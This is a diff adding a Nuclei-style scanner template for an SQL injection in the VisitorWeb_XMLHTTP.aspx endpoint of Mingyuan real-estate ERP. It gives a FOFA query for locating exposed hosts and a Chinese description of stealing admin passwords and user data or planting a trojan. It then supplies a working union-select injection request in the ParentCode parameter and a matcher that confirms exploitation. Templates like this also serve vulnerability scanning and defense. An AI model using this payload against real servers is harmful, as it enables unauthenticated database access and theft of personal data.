@@ -1,0 +1,27 @@
+id: MingyuandichanERP-VisitorWeb_XMLHTTP-SQL
+
+info:
+  name: 明源地产ERP VisitorWeb_XMLHTTP.aspx SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="/_common/scripts/md5-min.js"
+    明源地产ERP VisitorWeb_XMLHTTP.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - 
+  tags: sql injection
+
+http:
+  - raw:
+      - |-
+        GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1'+union+select+@@version--+c HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - 'status_code==200 && contains_all(body,"Microsoft")'
